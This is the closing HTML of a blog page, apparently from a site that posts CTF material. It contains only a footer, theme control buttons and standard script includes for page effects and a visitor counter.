2025-09-25 16:12:34">2025-09-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/lakectf/poster.webp);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
